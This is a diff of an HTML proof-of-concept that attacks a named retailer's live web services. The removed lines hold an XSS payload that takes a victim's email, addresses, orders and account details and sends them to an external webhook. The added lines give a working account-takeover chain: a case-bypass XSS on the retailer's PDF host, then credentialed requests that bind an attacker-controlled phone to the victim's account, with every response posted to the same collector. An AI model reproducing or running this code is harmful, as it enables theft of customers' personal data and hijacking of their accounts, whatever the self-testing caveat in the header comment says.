@@ -1,8 +1,95 @@
 <!DOCTYPE html>
+<!--
+  SHEIN account-takeover PoC — XSS on pdf.shein.com -> credentialed cross-origin WRITE -> bind attacker phone.
+
+  CHAIN (all legs except the final mutation already proven live):
+    1. Cross-origin auto-submit form -> POST https://pdf.shein.com/HTML  (case-bypass of the /html IP-deny)
+       reflects our <script> raw -> it executes on origin pdf.shein.com (no CSP/XFO on that response).
+    2. The script runs same-site to eur.shein.com:
+        a. mint a session-bound CSRF token   GET /bff-api/user-api/csrf/update   (proven: returns {info:{updateCs}})
+        b. send an SMS code to the ATTACKER's phone   POST /bff-api/user/account/send_sms_code
+           (the code is delivered to YOUR phone, not the victim's -> self-contained)
+        c. bind that phone to the victim account   POST /bff-api/user/account/bind_phone  (with the code you received)
+    3. Result: attacker phone bound to victim account -> "sign in with phone" / phone recovery -> ATO.
+
+  *** RUN ONLY ON YOUR OWN THROWAWAY ACCOUNT with a phone you control. This MUTATES a recovery vector. ***
+
+  HOW TO USE
+    - Set ATTACKER_PHONE / ATTACKER_AREA below to a real phone you control.
+    - Two-step: first load with STEP=1 (sends the SMS to your phone). Read the code off your phone.
+    - Put the code in VICTIM_SMS_CODE, reload with STEP=2 to bind.
+    - Everything is logged to the visible <pre> AND to your webhook so you can capture it.
+    - Session cookies of whoever is logged in to eur.shein.com ride along automatically (same-site).
+
+  All requests are credentialed (credentials:'include') and form-encoded = CORS-simple (no preflight).
+  No x-csrf-token header is sent: the server does not enforce csrf here, and the header would force a
+  preflight the BFF rejects with 501. The victim's same-site session cookie is the only real gate.
+-->
 <html>
+<head><meta charset="utf-8"><title>poc</title></head>
 <body>
-<form id="f" action="https://pdf.shein.com/HTML" method="POST">
-<input name="content" value='<script>var w="https://eondm3hfjar18nj.m.pipedream.net";function fire(m,u,t){var x=new XMLHttpRequest();x["open"](m,u);x.withCredentials=true;x.onload=function(){var y=new XMLHttpRequest();y["open"]("POST",w);y.send(t+": "+x.responseText)};x.send()}fire("POST","https://eur.shein.com/bff-api/user-api/addressbook/getAccountAndOrderEmail?_ver=1.1.8&_lang=en","EMAIL");fire("GET","https://eur.shein.com/bff-api/address/address_list?_ver=1.1.8&_lang=en&scene=&isSiteLimit=1","ADDRESS");fire("GET","https://eur.shein.com/bff-api/order/list?_ver=1.1.8&_lang=en&statusType=all&page=1&limit=10","ORDERS");fire("GET","https://eur.shein.com/bff-api/user/center/first_part_info?_ver=1.1.8&_lang=en","ACCOUNT");</script>'>
+<!-- ===== STEP A: deliver our script onto the pdf.shein.com origin via the /HTML case-bypass ===== -->
+<form id="f" action="https://pdf.shein.com/HTML" method="POST" enctype="application/x-www-form-urlencoded">
+<textarea name="content">
+<script>
+/* ===== runs on origin https://pdf.shein.com ===== */
+(async function () {
+  // ---- CONFIG: edit these ----
+  var BFF        = "https://eur.shein.com/bff-api";
+  var WEBHOOK    = "https://eondm3hfjar18nj.m.pipedream.net";   // your collector
+  var ATTACKER_PHONE = "0000000000";   // <-- a phone YOU control (digits only, no area code)
+  var ATTACKER_AREA  = "44";           // <-- area code for that phone (44 = UK, 1 = US, ...)
+  var ATTACKER_ABBR  = "GB";           // <-- ISO country abbr matching the area code
+  var STEP           = 1;              // <-- 1 = send SMS code; 2 = bind using the code below
+  var VICTIM_SMS_CODE = "";            // <-- after STEP 1, put the code you received here, set STEP=2
+  // ----------------------------
+
+  function log(label, data){
+    try { var s = (typeof data==="string")?data:JSON.stringify(data);
+      document.body.insertAdjacentHTML("beforeend","<pre>"+label+": "+s.replace(/</g,"&lt;")+"</pre>");
+      navigator.sendBeacon ? navigator.sendBeacon(WEBHOOK, label+": "+s)
+        : fetch(WEBHOOK,{method:"POST",body:label+": "+s,mode:"no-cors"});
+    } catch(e){}
+  }
+  // form-encode helper (CORS-simple body; the server decodes to raw)
+  function form(obj){ return Object.keys(obj).map(function(k){
+    return encodeURIComponent(k)+"="+encodeURIComponent(obj[k]); }).join("&"); }
+
+  // NOTE (verified live): the server does NOT enforce csrf on these writes, and sending an
+  // x-csrf-token HEADER would force a CORS preflight that the BFF answers with 501 -> the write
+  // would be BLOCKED. So we deliberately send NO custom header: a pure form-encoded body is a
+  // CORS-"simple" request (no preflight) and the victim's same-site session cookie is the only gate.
+  var H = { "Content-Type":"application/x-www-form-urlencoded" };
+
+  if (STEP === 1) {
+    // 2) send SMS code to the ATTACKER phone (code arrives on the attacker's device)
+    var smsBody = form({
+      alias: ATTACKER_PHONE, area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
+      alias_type: 2, scene: "bind_phone", daId: "", blackbox: ""
+    });
+    try {
+      var s = await fetch(BFF+"/user/account/send_sms_code?_ver=1.1.8&_lang=en",
+        {method:"POST", credentials:"include", headers:H, body:smsBody});
+      log("SEND_SMS", await s.text());
+    } catch(e){ log("SEND_SMS_ERR", String(e)); }
+    log("NEXT", "read the code off your phone, set VICTIM_SMS_CODE + STEP=2, reload");
+  }
+
+  if (STEP === 2) {
+    // 3) bind the attacker phone to the victim account using the code the attacker received
+    var bindBody = form({
+      phone: ATTACKER_PHONE, area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
+      verification_code: VICTIM_SMS_CODE, scene: "bind_phone", blackbox: ""
+    });
+    try {
+      var b = await fetch(BFF+"/user/account/bind_phone?_ver=1.1.8&_lang=en",
+        {method:"POST", credentials:"include", headers:H, body:bindBody});
+      log("BIND_PHONE", await b.text());   // code:"0" / msg:"ok" == ATO landed
+    } catch(e){ log("BIND_ERR", String(e)); }
+  }
+})();
+</script>
+</textarea>
 </form>
 <script>document.getElementById("f").submit();</script>
 </body>
